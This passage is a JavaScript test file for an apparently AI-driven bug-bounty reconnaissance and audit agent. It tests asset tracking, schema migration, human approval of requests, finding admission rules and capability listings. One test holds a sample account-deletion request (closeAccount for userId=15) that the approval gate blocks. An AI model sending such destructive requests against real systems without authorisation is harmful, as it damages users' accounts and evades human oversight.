  const { __resetSharedDomainOpensForTests } = await import("../lib/src.js");
  __resetSharedDomainOpensForTests();
  /* 内存域：首开时 assets 表里藏着一条 legacy 非法 method 记录，模拟旧版写入的盘上数据 */
  const domain = new MemoryDomain();
  domain.table("assets").put("session-legacy:asset-90", { id: "asset-90", sessionId: "session-legacy", type: "subdomain", value: "hr.mi.com", method: "active" });
  let openCalls = 0;
  const h0 = harness();
  /* 换上可控 open：前 1 次直接把带脏数据的域返回给 loadAll 之外的路径不可行——
     MemoryDomain 是 table() 直返，没有 loadAll 校验环节，无法在 harness 里复现 facility 的 open 校验。
     改为模拟：open() 第一次抛 invalid-record 域错误，第二次返回干净域。 */
  const err = Object.assign(new Error("domain 'src': stored record 'session-legacy:asset-90' in table 'assets' does not match its schema"), { code: "invalid-record" });
  h0.ctx.storageDomain = { open: async () => { openCalls++; if (openCalls === 1) throw err; return domain; } };
  const parent = h0.exec("retry-sess");
  /* 第一次 src 工具调用 → domain() 首开失败 */
  await assert.rejects(h0.run("src_state", {}, parent), /does not match its schema/, "首开被 legacy 记录拒绝");
  assert.equal(openCalls, 1);
  /* [修复前 bug] rejected promise 被实例永久持有：数据修复后重试仍重放同一错误。
     [修复后] domain() 清掉 rejected promise，下次调用重新 open（此时数据已修）→ 成功。 */
  domain.table("assets").delete("session-legacy:asset-90");
  const state = await h0.run("src_state", {}, parent);
  assert.equal(openCalls, 2, "第二次调用触发了重新 open");
  assert.equal(state.initialized, false, "重试后 domain 正常服务（干净域返回初始状态）");
  __resetSharedDomainOpensForTests();
});
test("[local.45] legacy 资产 method 归一化：domain open 能加载旧版自由文本记录（active→authorized-active）", async () => {
  const { srcAssetSchema } = await import("../lib/src.js");
  /* 旧版（枚举约束前）写入的记录：method 是自由文本 */
  const legacy = srcAssetSchema.safeParse({ id: "asset-90", sessionId: "s", type: "subdomain", value: "hr.mi.com", meta: "国内业务子域", source: "DNS + HTTP 探测", method: "active", confidence: 0.95, status: "confirmed" });
  assert.equal(legacy.success, true, "legacy 记录能过 schema（资产只增不删，不丢数据）");
  assert.equal(legacy.success ? legacy.data.method : "", "authorized-active", "active 归一化为 authorized-active");
  /* 新写入仍受枚举约束（工具入参走的是这份 schema 的 strict 面） */
  const bad = srcAssetSchema.safeParse({ id: "a", sessionId: "s", type: "subdomain", value: "x.test", method: "nonsense" });
  assert.equal(bad.success, false, "未知 method 仍拒绝");
  /* 缺省字段仍自动补全 */
  const sparse = srcAssetSchema.safeParse({ id: "a", sessionId: "s", type: "root-domain", value: "y.test" });
  assert.equal(sparse.success, true);
  assert.equal(sparse.success ? sparse.data.method : "", "passive");
});

/* [local.46] /src-approve 直写同步投影：合成 src_add_asset 事件（修面板 0 资产双账本漂移）；
   resolve 事件走 helper 带唯一 callId（修第二条起会话解析抛 more-than-one-start → 历史加载失败横幅）。 */
test("[local.46] /src-approve：合成 src_add_asset 投影事件 + resolve 事件 callId 唯一", async () => {
  const h = harness();
  const parent = h.exec("l46");
  await h.run("src_add_goal", { target: "example.com", objective: "l46 验证" }, parent);
  await h.run("src_request_asset_confirm", { domain: "partner-brand.test", evidence: "疑似合作方" }, parent);
  await h.run("src_request_asset_confirm", { domain: "other-brand.test", evidence: "疑似第二个" }, parent);
  const state = await h.run("src_state", {}, parent);
  const rows = state.pendingApprovals.filter((r) => r.method === "ASSET" && r.status === "pending");
  const idPartner = rows.find((r) => r.url === "partner-brand.test").id;
  const idOther = rows.find((r) => r.url === "other-brand.test").id;
  const cmd = h.commands.get("src-approve");
  await cmd.handler({ rawInput: `${idPartner} allow 确认`, agent: { session: parent.agent.session, followup: async () => {} } });
  await cmd.handler({ rawInput: `${idOther} reject 否`, agent: { session: parent.agent.session, followup: async () => {} } });
  const events = h.sessions.get("l46").events;
  /* resolve 事件：唯一真实 callId（undefined 会让客户端解析器把所有无 callId 事件归到同一 key） */
  const resolves = events.filter((e) => e.type === "tool/call" && e.data?.name === "src_resolve_approval");
  assert.equal(resolves.length, 2);
  const callIds = resolves.map((e) => e.data.callId);
  for (const c of callIds) assert.ok(typeof c === "string" && c !== "" && c !== "undefined", "resolve 事件必须带真实 callId");
  assert.notEqual(callIds[0], callIds[1], "两次审批的 callId 互不相同");
  /* 资产事件：直写落库同步合成 src_add_asset，投影与 store 双账本一致 */
  const addAssets = events.filter((e) => e.type === "tool/call" && e.data?.name === "src_add_asset");
  assert.equal(addAssets.length, 2, "两次归属决定各合成一条 src_add_asset");
  const a1 = JSON.parse(addAssets[0].data.arguments);
  assert.equal(a1.value, "partner-brand.test");
  assert.equal(a1.type, "root-domain");
  assert.equal(a1.status, "confirmed");
  assert.equal(a1.method, "user-confirmed");
  assert.equal(a1.confidence, 1);
  assert.ok(typeof a1.source === "string" && a1.source.includes("用户归属确认"), "source 标注用户决定");
  const a2 = JSON.parse(addAssets[1].data.arguments);
  assert.equal(a2.value, "other-brand.test");
  assert.equal(a2.status, "excluded");
  /* 合成事件能被投影 fold 正常消费（UI 资产 tab/计数的最终消费者） */
  const { applySrcEvent, srcInitialState } = await import("../lib/src.js");
  let st = srcInitialState;
  for (const ev of addAssets) st = applySrcEvent(st, ev);
  assert.ok(st.assets.some((a) => a.value === "partner-brand.test" && a.status === "confirmed"), "投影资产含确认域");
  assert.ok(st.assets.some((a) => a.value === "other-brand.test" && a.status === "excluded"), "投影资产含否决域");
});

/* [local.57] 子代理 src_add_asset 跨会话写入的投影对齐：中通会话实测漂移——子代理把资产写入
   engagement（父）单元（store 91 条），但父会话日志里没有任何 src_add_asset 事件（常规 tool/call
   只落在子代理自己的日志），历史加载按父日志 fold 只余 43 条。修复：跨会话写入时实时合成
   src_add_asset 投影事件进父日志（父自身调用不重复合成；src_submit 显式带同一资产时 store 判重、
   也不会双投影）；折叠父日志全量事件必须与 store 资产集合一致。 */
test("[local.57] 子代理 src_add_asset 实时合成父投影事件：fold 父日志与 store 资产对齐", async () => {
  const h = harness();
  const parent = h.exec("l57p");
  const child = h.exec("l57c", "l57p");
  /* harness 的 h.run 直连 execute 不落会话日志；真实宿主会把常规 tool/call append 进日志。
     这里模仿宿主：父的常规调用也落父日志，保证 fold 对齐断言忠实于生产语义。 */
  const parentEvents = h.sessions.get("l57p").events;
  let manualSeq = 0;
  const loggedRun = async (name, args, execution) => {
    const out = await h.run(name, args, execution);
    parentEvents.push({ type: "tool/call", data: { turn: 1, step: ++manualSeq, callId: `call-manual-${manualSeq}`, name, arguments: JSON.stringify(args) } });
    return out;
  };
  await loggedRun("src_add_goal", { target: "zto.test", objective: "投影对齐验证" }, parent);
  const intent = await loggedRun("src_add_intent", { title: "recon", goalId: "goal-1" }, parent);
  const syntheticCount = () => h.sessions.get("l57p").events.filter((e) => e.type === "tool/call" && String(e.data?.callId ?? "").startsWith("src-submit-") && e.data?.name === "src_add_asset").length;
  /* 父自己登记：常规 tool/call 已在父日志，不得重复合成 */
  await loggedRun("src_add_asset", { type: "root-domain", value: "zto.test", source: "goal 主域" }, parent);
  assert.equal(syntheticCount(), 0, "父自身调用不得合成");
  /* 子代理直接登记 14 条（复刻中通 recon child） */
  for (let i = 1; i <= 14; i++) await h.run("src_add_asset", { type: "subdomain", value: `n${i}.ztoglobal.test`, source: "crt.sh 证书日志" }, child);
  assert.equal(syntheticCount(), 14, "每条跨会话登记都要合成进父日志");
  const syntheticEvents = h.sessions.get("l57p").events.filter((e) => e.type === "tool/call" && String(e.data?.callId ?? "").startsWith("src-submit-") && e.data?.name === "src_add_asset");
  for (const e of syntheticEvents) assert.ok(typeof e.data.callId === "string" && e.data.callId.length > "src-submit-".length, "合成事件必须带唯一 callId");
  /* 子代理再显式 submit 同一批：store 判重后 accepted 为 0，不得双投影 */
  const sub = await h.run("src_submit", { intentId: intent.id, stage: "completed", summary: "recon done", assets: Array.from({ length: 14 }, (_, i) => ({ type: "subdomain", value: `n${i + 1}.ztoglobal.test`, source: "crt.sh 证书日志" })) }, child);
  assert.equal(sub.assets, 0, "重复资产不重复受理");
  assert.equal(syntheticCount(), 14, "src_submit 对已合成资产不再追加投影");
  /* 终极对齐：fold 父日志全部 tool/call 事件 → 投影资产数必须等于 store 资产数（历史加载视角） */
  const storeCount = (await h.run("src_state", {}, parent)).counts.assets;
  let st = srcInitialState;
  for (const ev of parentEvents) if (ev.type === "tool/call") st = applySrcEvent(st, ev);
  assert.equal(st.assets.length, storeCount, "fold 父日志的资产数必须与 store 一致（含子代理登记的 14 条）");
  assert.ok(st.assets.some((a) => a.value === "n7.ztoglobal.test" && a.status === "confirmed"), "子代理登记的资产在投影可见");
});

test("[capability] 收编链路：wx-minapp-recon 清单可见 + SKILL.md 可读含登录待办引导", async () => {
  const h = harness();
  const os = await import("node:os");
  const fs = await import("node:fs");
  const path = await import("node:path");
  const repoSkill = path.resolve("skills/wx-minapp-recon");
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), "caps-minapp-"));
  const capsDir = path.join(tmp, "capabilities", "wx-minapp-recon");
  fs.mkdirSync(capsDir, { recursive: true });
  fs.cpSync(repoSkill, capsDir, { recursive: true });
  /* 模拟 caps-sync 产物：index.json（含 status）+ capabilities.yaml（声明+when） */
  fs.writeFileSync(path.join(tmp, "capabilities", "index.json"), JSON.stringify({ capabilities: [
    { id: "wx-minapp-recon", kind: "skill", from: `path:${repoSkill}`, enabled: true, ambiguous: false, wired: false, when: "目标含微信小程序资产需要逆向审计时", status: "installed", dir: capsDir, docs: "SKILL.md", scripts: [] }
  ] }, null, 2));
  fs.writeFileSync(path.join(tmp, "capabilities.yaml"), [
    "capabilities:",
    "  - id: wx-minapp-recon",
    `    from: path:${repoSkill}`,
    "    kind: skill",
    "    when: 目标含微信小程序资产需要逆向审计时"
  ].join("\n"));
  fs.mkdirSync(path.join(tmp, "profiles", "web"), { recursive: true });
  fs.writeFileSync(path.join(tmp, "profiles", "web", "cordis.patch.yml"), "");
  const prevHome = process.env.DSH_HOME;
  process.env.DSH_HOME = tmp;
  try {
    const list = await h.run("src_list_capabilities", {}, h.exec("cmd-1"));
    const item = list.items.find((x) => x.id === "wx-minapp-recon");
    assert.ok(item, "清单必须包含 wx-minapp-recon");
    assert.equal(item.kind, "skill");
    assert.equal(item.status, "installed");
    assert.match(item.when, /小程序/, "when 必须声明小程序逆向场景");
    const doc = await h.run("src_read_capability", { id: "wx-minapp-recon" }, h.exec("cmd-1"));
    assert.match(doc.text, /请在微信打开目标小程序并确认登录/, "SKILL.md 必须含登录待办引导（agent 读到后才会提 src_user_todo）");
    assert.match(doc.text, /wedecode/, "SKILL.md 含反编译依赖说明");
  } finally {
    if (prevHome === void 0) delete process.env.DSH_HOME; else process.env.DSH_HOME = prevHome;
    fs.rmSync(tmp, { recursive: true, force: true });
  }
});

/* [local.57] src_fetch_policy SPA/反爬检测：正文拿不到时必须主动引导去 src_list_capabilities
   找抓取方法论 skill（中通会话实测：sec.zto.com SPA + 公众号反爬，已装 skill 没被想起，指挥官自行放弃）。 */
test("[local.57] src_fetch_policy SPA 空壳/短响应给出能力清单引导，正常正文不给提示", async () => {
  const h = harness();
  const parent = h.exec("l57f");
  const http = await import("node:http");
  const server = http.createServer((req, res) => {
    if (req.url === "/spa") {
      res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
      res.end("<!doctype html><html><head><title>中通安全应急响应中心（ZSRC）</title></head><body><div id=\"app\"></div><script src=/app.js></script></body></html>");
    } else if (req.url === "/ok") {
      res.writeHead(200, { "content-type": "text/html; charset=utf-8" });
      res.end("<html><body><p>中通 SRC 收录标准：严重漏洞给予积分奖励，具体评级由安全团队复核确定，范围包括 Web 应用、移动客户端与 API 接口等多类资产。</p></body></html>");
    } else { res.writeHead(404); res.end("nope"); }
  });
  await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
  const port = server.address().port;
  try {
    const spa = await h.run("src_fetch_policy", { url: `http://127.0.0.1:${port}/spa` }, parent);
    assert.match(spa.text, /ZSRC|ZSRC|中通/, "SPA 页标题文本仍在");
    assert.ok(spa.scrapeHint, "SPA 空壳必须给引导提示");
    assert.match(spa.scrapeHint, /src_list_capabilities/, "提示必须引导到能力清单");
    assert.match(spa.scrapeHint, /src-rules-scraper/, "提示点名规则抓取方法论 skill");
    const ok = await h.run("src_fetch_policy", { url: `http://127.0.0.1:${port}/ok` }, parent);
    assert.equal(ok.scrapeHint, void 0, "正常正文不得给提示");
    assert.equal(ok.text.includes("scrapeHint"), false);
  } finally { server.close(); }
});

/* [local.57] src_add_intent 锚点自愈：中通会话实测模型建 intent 时两锚点全漏，报
   exactly-one-anchor 错浪费一整轮重试。锚点缺失时自动锚到当前 goal；无 goal 报错指向 src_add_goal。 */
test("[local.57] src_add_intent 锚点缺失自动锚到当前 goal，无 goal 指路 src_add_goal", async () => {
  const h = harness();
  const parent = h.exec("l57i");
  /* 无 goal：报错文案直接指路 src_add_goal */
  await assert.rejects(
    () => h.run("src_add_intent", { title: "no goal yet" }, parent),
    /先调 src_add_goal/
  );
  const goal = await h.run("src_add_goal", { target: "zto.test", objective: "anchor heal" }, parent);
  /* 两锚点全漏：自动锚到当前 goal，照常走 spawns */
  const intent = await h.run("src_add_intent", { title: "被动侦察", priority: 8 }, parent);
  assert.equal(intent.edgeKind, "spawns");
  assert.equal(intent.sourceId, goal.id);
  /* [local.66] 两锚点同时出现：自愈为 derived_from 锚（更具体），不再报错浪费重试轮 */
  const fact = await h.run("src_add_fact", { intentId: intent.id, kind: "info", detail: "d" }, parent);
  const healed = await h.run("src_add_intent", { title: "both anchors", goalId: goal.id, derivedFromFactId: fact.id }, parent);
  assert.equal(healed.edgeKind, "derived_from");
  assert.equal(healed.sourceId, fact.id);
  /* 双锚点但 fact 不存在：store 的 unknown fact 报错照常可读 */
  await assert.rejects(
    () => h.run("src_add_intent", { title: "both anchors bad fact", goalId: goal.id, derivedFromFactId: "fact-999" }, parent),
    /unknown fact|fact-999/
  );
});

/* [local.58] fold 层锚点自愈镜像：宿主日志落的是模型原始参数（无 goalId），local.57 只修 execute 层导致
   中通 session-9864adca 实测 11 条 intent 全部被 fold 丢弃，级联蒸发 fact/finding/checkpoint/research/approval
   （面板 intents/facts/findings 全灭而 assets/todos 幸存）。fold 必须与 execute 同样自愈：两锚点全漏且当前
   goal 存在 → 锚到该 goal；两锚点同传仍丢弃；无 goal 仍丢弃。stateVersion 10→11 让宿主重算存量会话投影。 */
test("[local.58] fold 层锚点自愈：无锚点 intent 收下并级联恢复 fact，两锚点同传/无 goal 仍丢弃", async () => {
  const h = harness();
  const parent = h.exec("l58fold");
  const parentEvents = h.sessions.get("l58fold").events;
  let manualSeq = 0;
  const loggedRun = async (name, args, execution) => {
    const out = await h.run(name, args, execution);
    parentEvents.push({ type: "tool/call", data: { turn: 1, step: ++manualSeq, callId: `call-manual-${manualSeq}`, name, arguments: JSON.stringify(args) } });
    return out;
  };
  const goal = await loggedRun("src_add_goal", { target: "zto.test", objective: "fold heal" }, parent);
  /* 模型不传锚点（被工具描述引导后的真实行为）：execute 自愈成功，宿主日志记原始参数 */
  const intent = await loggedRun("src_add_intent", { title: "被动侦察与资产测绘", priority: 8 }, parent);
  assert.equal(intent.edgeKind, "spawns");
  const fact = await loggedRun("src_add_fact", { intentId: intent.id, kind: "info", detail: "子域 n1.zto.test 存活" }, parent);
  /* fold 父日志全量事件 → intent 与 fact 必须落投影（local.57 回归闸） */
  let st = srcInitialState;
  for (const ev of parentEvents) if (ev.type === "tool/call") st = applySrcEvent(st, ev);
  let view = viewSrcState(st);
  assert.equal(view.counts.intents, 1, "无锚点 intent 在 fold 必须被自愈收下（local.57 实测曾为 0）");
  assert.equal(view.counts.facts, 1, "intent 恢复后 fact 级联恢复");
  assert.equal(st.nodes.find((n) => n.kind === "intent")?.id, "intent-1");
  /* [local.66] 两锚点同传：fold 镜像 execute 层自愈——fact 存在即按 derived_from 锚收下
     （hackone 实战里同 title+detail 的失败重传会被去重，不产生双节点） */
  st = applySrcEvent(st, { type: "tool/call", data: { turn: 1, step: 99, callId: "call-both", name: "src_add_intent", arguments: JSON.stringify({ title: "both anchors", goalId: goal.id, derivedFromFactId: fact.id }) } });
  assert.equal(viewSrcState(st).counts.intents, 2, "双锚点同传 fold 必须收下（local.58 曾丢弃）");
  const healedNode = st.nodes.filter((n) => n.kind === "intent" && n.title === "both anchors")[0];
  const healedEdge = (st.edges ?? []).find((e) => e.targetId === healedNode?.id);
  assert.equal(healedEdge?.kind, "derived_from", "fact 存在时优先按 derived_from 锚");
  st = applySrcEvent(st, { type: "tool/call", data: { turn: 1, step: 100, callId: "call-both-2", name: "src_add_intent", arguments: JSON.stringify({ title: "双锚新意图", goalId: goal.id, derivedFromFactId: fact.id }) } });
  const bothNode = st.nodes.filter((n) => n.kind === "intent" && n.title === "双锚新意图")[0];
  assert.notEqual(bothNode, void 0, "双锚点同传 fold 必须收下（local.58 曾丢弃）");
  assert.equal((st.edges ?? []).find((e) => e.targetId === bothNode?.id)?.kind, "derived_from", "fact 存在时优先按 derived_from 锚");
  /* 双锚点但 fact 不在投影：退回 goal 锚 */
  st = applySrcEvent(st, { type: "tool/call", data: { turn: 1, step: 101, callId: "call-both-3", name: "src_add_intent", arguments: JSON.stringify({ title: "双锚退锚意图", goalId: goal.id, derivedFromFactId: "fact-424242" }) } });
  const fallbackNode = st.nodes.filter((n) => n.kind === "intent" && n.title === "双锚退锚意图")[0];
  assert.notEqual(fallbackNode, void 0, "fact 缺失时双锚点退回 goal 锚收下");
  assert.equal((st.edges ?? []).find((e) => e.targetId === fallbackNode?.id)?.kind, "spawns", "退回锚走 spawns");
  /* 无锚点且无 goal：仍丢弃 */
  let st2 = srcInitialState;
  st2 = applySrcEvent(st2, { type: "tool/call", data: { turn: 1, step: 1, callId: "call-nogoal", name: "src_add_intent", arguments: JSON.stringify({ title: "no goal" }) } });
  assert.equal(viewSrcState(st2).counts.intents, 0, "无 goal 时无锚点 intent 仍丢弃");
  /* 显式传 goalId 的老会话语义不变：goalId 与当前 goal 不匹配仍丢弃 */
  st2 = srcInitialState;
  st2 = applySrcEvent(st2, { type: "tool/call", data: { turn: 1, step: 1, callId: "c1", name: "src_add_goal", arguments: JSON.stringify({ target: "zto.test", objective: "g" }) } });
  st2 = applySrcEvent(st2, { type: "tool/call", data: { turn: 1, step: 2, callId: "c2", name: "src_add_intent", arguments: JSON.stringify({ title: "wrong goal", goalId: "goal-99" }) } });
  assert.equal(viewSrcState(st2).counts.intents, 0, "goalId 不匹配仍丢弃（老语义不变）");
});

/* [local.58] src_add_finding / src_submit 的 attackPrerequisites 降为 schema 可选：execute 层本就容忍缺失，
   store 准入闸（缺前提拒收）给出比宿主 "missing required property" 详细得多的指导性报错——
   漏传时让错误落在有教学价值的层（中通会话实测宿主拒绝后模型只能瞎猜重试）。 */
test("[local.58] attackPrerequisites schema 可选：漏传不再被宿主拦截，由 store 准入闸给出指导性报错", async () => {
  const h = harness();
  const addFindingParams = h.tools.get("src_add_finding").parameters;
  assert.equal(addFindingParams.properties.attackPrerequisites.required, void 0, "src_add_finding.attackPrerequisites 必须 optional");
  assert.equal(addFindingParams.required.includes("attackPrerequisites"), false, "required 数组不得包含 attackPrerequisites");
  const submitFindingParams = h.tools.get("src_submit").parameters.properties.findings.items.properties;
  assert.equal(submitFindingParams.attackPrerequisites.required, void 0, "src_submit.findings[].attackPrerequisites 必须 optional");
  /* execute 层漏传 → store 准入闸拒收，报错必须指导模型补什么（而非宿主的干巴 schema 错误） */
  const parent = h.exec("l58prereq");
  await h.run("src_add_goal", { target: "example.test", objective: "prereq optional", authorization: "SRC" }, parent);
  await h.run("src_add_intent", { title: "audit", goalId: "goal-1" }, parent);
  const factEvidence = (await h.run("src_add_fact", { intentId: "intent-1", kind: "http", detail: "GET / => 200", confidence: 0.9 }, parent)).id;
  await assert.rejects(
    () => h.run("src_add_finding", { intentId: "intent-1", title: "版本指纹泄露", severity: "low", impact: "暴露版本号，可匹配已知 CVE 定向利用", affectedScope: "全站", remediation: "隐藏版本", pocEvidence: ["GET / => VAppServer"], reproducibleSteps: ["GET /"], victimImpact: "运维与用户均无感知地暴露后端框架与版本信息，攻击者可据此检索匹配的已知漏洞发起定向利用", concreteLossEvidence: [factEvidence] }, parent),
    /准入拒绝.*利用前提/
  );
  /* 补上前提后照常入库 */
  const finding = await h.run("src_add_finding", { intentId: "intent-1", title: "版本指纹泄露", severity: "low", impact: "暴露版本号，可匹配已知 CVE 定向利用", affectedScope: "全站", remediation: "隐藏版本", pocEvidence: ["GET / => VAppServer"], reproducibleSteps: ["GET /"], victimImpact: "运维与用户均无感知地暴露后端框架与版本信息，攻击者可据此检索匹配的已知漏洞发起定向利用", attackPrerequisites: "仅需网络可达目标首页，无需登录或任何用户交互", concreteLossEvidence: [factEvidence] }, parent);
  assert.ok(finding.id, "补齐前提后入库成功");
});

/* [local.58] 跨会话审批投影对齐：子代理 src_http / src_resolve_approval 的审批 store 行落在 engagement（父）
   单元，但合成事件此前只落在子代理自己的日志——父面板「待审」区永远空（中通会话 approval-1/3/4 实测漂移）。
   跨会话时向父日志补同事件；fold 按 id 幂等去重。 */
test("[local.58] 子代理挂起/解决审批实时合成父投影事件", async () => {
  let hitCount = 0;
  const server = http.createServer((req, res) => { hitCount++; res.writeHead(204); res.end(); });
  await new Promise((r) => server.listen(0, "127.0.0.1", r));
  const port = server.address().port;
  const h = harness();
  const parent = h.exec("l58ap");
  const child = h.exec("l58apc", "l58ap");
  await h.run("src_add_goal", { target: "127.0.0.1", objective: "审批跨会话投影" }, parent);
  try {
    const result = await h.run("src_http", { url: `http://127.0.0.1:${port}/api-c/user/v1/closeAccount`, method: "GET", headers: { userId: "15", authorization: "Bearer t" }, justification: "删除 userId=15" }, child);
    assert.equal(result.approval, "pending");
    const parentEvents = () => h.sessions.get("l58ap").events.filter((e) => e.type === "tool/call");
    const childApprovalCount = h.sessions.get("l58apc").events.filter((e) => e.type === "tool/call" && e.data.name === "src_record_pending_approval").length;
    assert.equal(childApprovalCount, 1, "子代理自己的日志照旧落事件");
    assert.equal(parentEvents().filter((e) => e.data.name === "src_record_pending_approval").length, 1, "父日志必须合成同一条审批事件");
    let st = srcInitialState;
    for (const ev of parentEvents()) st = applySrcEvent(st, ev);
    assert.equal(viewSrcState(st).counts.pendingApprovals, 1, "fold 父日志后待审区可见");
    /* 子代理 resolve → 父投影同步 resolution，不 stale */
    const rejected = await h.run("src_resolve_approval", { id: result.pendingApprovalId, action: "reject", note: "误伤风险" }, child);
    assert.equal(rejected.status, "rejected");
    st = srcInitialState;
    for (const ev of parentEvents()) st = applySrcEvent(st, ev);
    assert.equal(viewSrcState(st).pendingApprovals[0].status, "rejected", "子代理 resolve 后父投影不 stale");
    assert.equal(hitCount, 0, "拒绝后不应发出");
  } finally { server.close(); }
});

/* [local.58] finalize blindSpots 的 category 别名：模型把维度名误写进 category（中通会话实测 3 条全踩，
   宿主 additionalProperties:false 拒绝后重试浪费一轮）；schema 声明别名 + execute 自动映射。 */
test("[local.58] finalize blindSpots 误用 category 键自动映射为 dimension", async () => {
  const h = harness();
  const parent = h.exec("l58blindspot");
  await h.run("src_add_goal", { target: "https://example.test", objective: "blindspot alias", authorization: "SRC" }, parent);
  await h.run("src_add_intent", { title: "audit", goalId: "goal-1" }, parent);
  await h.run("src_update_intent", { intentId: "intent-1", status: "completed" }, parent);
  const factEvidence = (await h.run("src_add_fact", { intentId: "intent-1", kind: "http", detail: "GET / => VAppServer/6.0.0 banner", confidence: 0.9 }, parent)).id;
  await h.run("src_add_finding", { intentId: "intent-1", title: "版本指纹泄露", severity: "low", impact: "暴露版本号，可匹配已知 CVE 定向利用", affectedScope: "全站", remediation: "隐藏版本", pocEvidence: ["GET / => VAppServer/6.0.0"], reproducibleSteps: ["GET /"], victimImpact: "运维与用户均无感知地暴露后端框架与版本信息，攻击者可据此检索匹配的已知漏洞发起定向利用", attackPrerequisites: "仅需网络可达目标首页，无需登录或任何用户交互", concreteLossEvidence: [factEvidence] }, parent);
  await h.run("src_record_research", { intentId: "intent-1", category: "info-leak", hypothesis: "版本泄露", status: "verified", findingId: "finding-1" }, parent);
  /* 五个维度全用 category 键声明：映射成功后不再报「缺项」/「未声明」类 blocker */
  const result = await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: [
    { category: "http-authz-surface", status: "notApplicable" },
    { category: "cors-headers", status: "notApplicable" },
    { category: "dom-xhr", status: "notApplicable" },
    { category: "dict-budget", status: "notApplicable" },
    { category: "multi-account-cross-authz", status: "notApplicable" }
  ] }, parent);
  assert.equal(result.blockers.some((b) => /缺项|未声明/.test(b)), false, "category 别名应被映射，不报缺项");
  /* 混合写法也兼容：dimension 与 category 同传时 dimension 优先 */
  const result2 = await h.run("src_finalize_engagement", { remainingDirections: [], blindSpots: [
    { dimension: "http-authz-surface", status: "notApplicable" },
    { category: "cors-headers", status: "notApplicable" },
    { category: "dom-xhr", status: "notApplicable" },
    { category: "dict-budget", status: "notApplicable" },
    { category: "multi-account-cross-authz", status: "notApplicable" }
  ] }, parent);
  assert.equal(result2.blockers.some((b) => /缺项|未声明/.test(b)), false, "dimension/category 混用应兼容");
});

/* [local.57] src_add_goal 开局能力盘点：返回已安装能力 id/形态/触发场景（skill 用率根修——先知牌面）。 */
test("[local.57] src_add_goal 返回 capabilities 盘点（无清单时缺省）", async () => {
  const h = harness();
  const parent = h.exec("l57g");
  const goal = await h.run("src_add_goal", { target: "example.test", objective: "cap digest" }, parent);
  /* 测试隔离 DSH_HOME 无能力清单：capabilities 缺省不落键（lossless 边界） */
  assert.equal(goal.capabilities, void 0);
  /* 有清单：返回 id/kind/when，停用项过滤，12 上限 */
  const { mkdirSync, writeFileSync } = await import("node:fs");
  mkdirSync("/tmp/l57-caps/.caps-src/capa/.dsh/capabilities", { recursive: true });
  writeFileSync(process.env.DSH_HOME + "/capabilities.yaml", "settings: {}\ncapabilities:\n  - id: src-rules-scraper\n    kind: skill\n    from: path:/tmp/l57-caps\n    when: SPA 站抓取与厂商规则查询\n  - id: wechat-mp-reader\n    kind: skill\n    from: path:/tmp/l57-caps\n    when: 公众号文章读取\n  - id: disabled-one\n    kind: mcp\n    from: npm:x\n    enabled: false\n");
  const h2 = harness();
  const parent2 = h2.exec("l57g2");
  const goal2 = await h2.run("src_add_goal", { target: "example.test", objective: "cap digest 2" }, parent2);
  assert.ok(Array.isArray(goal2.capabilities));
  const ids = goal2.capabilities.map((c) => c.id);
  assert.ok(ids.includes("src-rules-scraper") && ids.includes("wechat-mp-reader"));
  assert.equal(ids.includes("disabled-one"), false, "停用能力不进牌面");
  const scraper = goal2.capabilities.find((c) => c.id === "src-rules-scraper");
  assert.equal(scraper.kind, "skill");
  assert.match(scraper.when, /SPA/);
});

/* [local.47] 全域往返校验：流程写完后，所有域表所有记录必须全部通过各自 valueSchema。
   存储域「写入时不校验、开盘时全量 zod 校验」——schema 与 writer 漂移只有往返测试能抓
   （local.44 给 ASSET 待审行写 method:"ASSET" 但 schema 枚举漏加，重启后开盘即炸，本测试就是补这个盲区）。 */
test("[local.47] 域往返：全流程落库记录全部通过开盘 schema（ASSET 待审行含 method=ASSET）", async () => {
  const { srcDomainSpec, __resetSharedDomainOpensForTests } = await import("../lib/src.js");
  __resetSharedDomainOpensForTests();
  const h = harness();
  const parent = h.exec("l47");
  await h.run("src_add_goal", { target: "example.com", objective: "往返校验" }, parent);
  await h.run("src_request_asset_confirm", { domain: "partner-brand.test", evidence: "疑似合作方" }, parent);
  const state = await h.run("src_state", {}, parent);
  const row = state.pendingApprovals.find((r) => r.method === "ASSET" && r.status === "pending");
  const cmd = h.commands.get("src-approve");
  await cmd.handler({ rawInput: `${row.id} allow 确认`, agent: { session: parent.agent.session, followup: async () => {} } });
  /* 模拟开盘 loadAll：拿回 harness 的 MemoryDomain，逐表逐条过 spec schema */
  const domain = await h.ctx.storageDomain.open();
  let checked = 0;
  for (const [name, tableSpec] of Object.entries(srcDomainSpec.tables)) {
    const table = domain.tables.get(name);
    if (table === void 0) continue;
    for (const [key, value] of table.rows) {
      const r = tableSpec.valueSchema.safeParse(value);
      if (!r.success) throw new Error(`[roundtrip] ${name}:${key} 开盘会拒绝：${JSON.stringify(r.error.issues.map((x) => ({ p: x.path.join("."), m: x.message })))}`);
      checked++;
    }
  }
  assert.ok(checked >= 3, `至少校验了 goal/待审/资产等 ${checked} 条记录`);
  /* 用户盘上的真实形状：method=ASSET 的已决行（approved/rejected + note + responseStatus 0）必须能过开盘校验 */
  const paSpec = srcDomainSpec.tables.pending_approvals.valueSchema;
  for (const diskLike of [
    { id: "approval-1", sessionId: "session-x", method: "ASSET", url: "partner-brand.test", path: "", headers: "", body: "", category: "asset-attribution", reason: "UI 验证：疑似合作方域", justification: "请确认…", status: "approved", note: "确认是", responseStatus: 0, createdAt: 1788129967356, updatedAt: 1788130043355 },
    { id: "approval-2", sessionId: "session-x", method: "ASSET", url: "other-brand.test", path: "", headers: "", body: "", category: "asset-attribution", reason: "UI 验证：第二个疑似域", justification: "请确认…", status: "rejected", note: "", responseStatus: 0, createdAt: 1788129967368, updatedAt: 1788130043355 }
  ]) {
    const r = paSpec.safeParse(diskLike);
    assert.equal(r.success, true, `盘上形状 method=ASSET（${diskLike.status}）必须能过开盘校验：${r.success ? "" : JSON.stringify(r.error.issues)}`);
  }
});

/* [local.31] 异步挂起队列：去重 + 投影 fold + resolve 幂等。 */
test("[local.31] src_http 同请求去重复用既有 pending（不堆队列）", async () => {
  const h = harness();
  const parent = h.exec("ap-dedup");
  await h.run("src_add_goal", { target: "127.0.0.1", objective: "去重验证" }, parent);
